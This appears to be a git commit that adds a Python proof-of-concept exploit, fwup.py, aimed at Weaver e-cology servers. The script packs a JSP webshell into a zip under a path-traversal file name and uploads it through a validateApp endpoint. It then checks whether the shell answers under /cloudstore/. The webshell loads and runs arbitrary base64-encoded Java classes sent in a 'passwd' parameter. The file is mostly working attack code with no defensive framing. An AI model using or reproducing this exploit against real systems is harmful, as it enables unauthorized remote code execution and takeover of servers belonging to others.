6491648caa26b4421179e7c06b80dd9fad54740e
captain_686 <53248484+captain686@users.noreply.github.com>
2021-07-12 03:39:15 +0800

    Add files via upload

---
+++ fwup.py
@@ -0,0 +1,81 @@
+ # -*- coding: UTF-8 -*-
+import zipfile
+import random
+import sys
+import requests
+import urllib3
+
+urllib3.disable_warnings()
+
+proxy = {"https":"http:127.0.0.1:8080"}
+
+def generate_random_str(randomlength=16):
+  random_str = ''
+  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
+  length = len(base_str) - 1
+  for i in range(randomlength):
+    random_str += base_str[random.randint(0, length)]
+  return random_str
+
+mm = generate_random_str(8)
+
+webshell_name1 = mm+'.jsp'
+webshell_name2 = '../../../'+webshell_name1
+
+def file_zip():
+    shell = """<%!
+    class U extends ClassLoader {
+        U(ClassLoader c) {
+            super(c);
+        }
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
+    }
+ 
+    public byte[] base64Decode(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+        } catch (Exception e) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+        }
+    }
+%>
+<%
+    String cls = request.getParameter("passwd");
+    if (cls != null) {
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+    }
+%>"""
+    # shell = """<%
+    # String str="test";
+    # out.println(str);
+    # %>"""   ## 替换shell内容
+    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
+    zf.writestr(webshell_name2, shell)
+
+def GetShell(urllist):
+    file_zip()
+    print('上传文件中')
+    urls = urllist + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
+    file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
+    requests.post(url=urls,files=file,timeout=60, verify=False, proxies=proxy)
+    GetShellurl = urllist+'/cloudstore/'+webshell_name1
+    GetShelllist = requests.get(url = GetShellurl, verify=False)
+    if GetShelllist.status_code == 200:
+        print('利用成功webshell地址为:'+GetShellurl)
+    else:
+        print('未找到webshell利用失败')
+
+def main():
+    if (len(sys.argv) == 2):
+        url = sys.argv[1]
+        GetShell(url)
+    else:
+        print("python3 poc.py http://xx.xx.xx.xx")
+
+if __name__ == '__main__':
+    main()
